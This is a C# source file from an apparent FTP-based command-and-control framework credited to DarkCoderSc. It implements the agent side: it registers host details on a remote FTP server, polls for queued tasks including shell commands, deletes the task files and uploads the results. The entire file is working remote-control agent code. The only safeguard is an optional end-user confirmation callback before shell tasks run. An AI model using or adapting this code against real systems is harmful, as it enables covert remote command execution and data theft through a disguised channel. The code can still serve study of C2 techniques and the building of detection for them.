/*
 * =========================================================================================
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * =========================================================================================
 */

using FtpC2.Responses;
using FtpC2.Tasks;
using System.Text.Json;
using System.Threading.Tasks;

namespace FtpAgent
{
    internal class AgentProtocol : ProtocolBase
    {

        public delegate bool DangerousActionConfirmationDelegate(string nature);

        public DangerousActionConfirmationDelegate? DangerousActionConfirmation;

        public AgentProtocol(string host, string username, string password, bool secure, Guid session)
            : base(host, username, password, secure)
        {
            this.Session = session;
        }

        public void RegisterOrUpdateAgent()
        {
            Agent agent = new();

            agent.Refresh(this.Session);

            string jsonAgent = JsonSerializer.Serialize(agent);

            string remoteFileName = PackRemoteFileName(
                Shared.PlaceHolders.AgentInformation,
                this.Session ?? Guid.Empty,
                null,
                PeerEncryptionHelper
            );

            UploadString(jsonAgent, remoteFileName);
        }

        public List<TaskWrapper> EnumerateTasks()
        {
            List<TaskWrapper> tasks = new();

            List<string> files = ListDirectory();            

            foreach (string file in files)
            {
                var packedFileName = UnpackRemoteFileName(file);
                if (packedFileName == null)
                    continue; // Ignore

                if (packedFileName.Name != Shared.PlaceHolders.TaskRequest)
                    continue; // Ignore
                try
                {
                    if (!packedFileName.Session.HasValue)
                        throw new FormatException($"Session GUID expected but not found for file \"{file}\".");

                    if (packedFileName.Session != this.Session)
                        continue; // Ignore

                    if (!CanProcessFile(packedFileName, SelfEncryptionHelper))
                        continue; // Ignore

                    // Download task content
                    string jsonData = DownloadString(file);

                    TaskWrapper? wrappedTask = JsonSerializer.Deserialize<TaskWrapper>(jsonData);
                    TaskWrapper? task = null;

                    if (wrappedTask == null || wrappedTask.Id != packedFileName.Uid)
                        throw new FormatException("File is corrupted or invalid.");
                    
                    switch(wrappedTask.TaskType)
                    {
                        case "TaskShellCommand":
                        {
                                if (DangerousActionConfirmation != null)
                                {
                                    if (!DangerousActionConfirmation.Invoke(wrappedTask.TaskType))
                                        throw new Exception("Task Action Denied by End-user.");
                                }

                                TaskShellCommand? unwrappedTask = JsonSerializer.Deserialize<TaskShellCommand>(jsonData);
                                if (unwrappedTask != null)
                                    task = unwrappedTask;

                                break;
                        }

                        case "TaskCommand":
                            {
                                TaskCommand? unwrappedTask = JsonSerializer.Deserialize<TaskCommand>(jsonData);
                                if (unwrappedTask != null)
                                    task = unwrappedTask;

                                break;
                            }

                        // Add your additional task classes here
                        // ...
                    }

                    if (task != null)
                        tasks.Add(task);                                      
                }
                catch
                {
                    // Any potential exceptions are intentionally ignored to guarantee the deletion
                    // of the task file. This precautionary measure prevents the persistence of a
                    // possibly corrupted task file on the remote server, which could adversely affect
                    // operations.                    
                }

                try
                {
                    // Before registering the new task, it is mandatory to remove the existing
                    // task request file from the remote server. This prerequisite step 
                    // ensures smooth creation and operation of the new task.
                    DeleteFile(file);
                }
                catch
                {
                    continue;
                }                
            }           

            return tasks;
        }

        public void RegisterNewResponse(ResponseWrapper response, Guid taskId)
        {
            response.TaskId = taskId;
            response.AgentId = this.Session ?? Guid.Empty;
            response.DateTime = DateTime.Now;
            response.ResponseType = response.GetType().Name;

            string jsonData = JsonSerializer.Serialize(response, response.GetType());

            string remoteFileName = PackRemoteFileName(
                Shared.PlaceHolders.ResponseRequest,
                this.Session ?? Guid.Empty,
                taskId,
                PeerEncryptionHelper
            );

            UploadString(jsonData, remoteFileName);

            ///
            UX.DisplaySuccess($"Task(`{taskId}`)->\"{response.DisplayName()}\" successfully processed.");
        }

    }
}
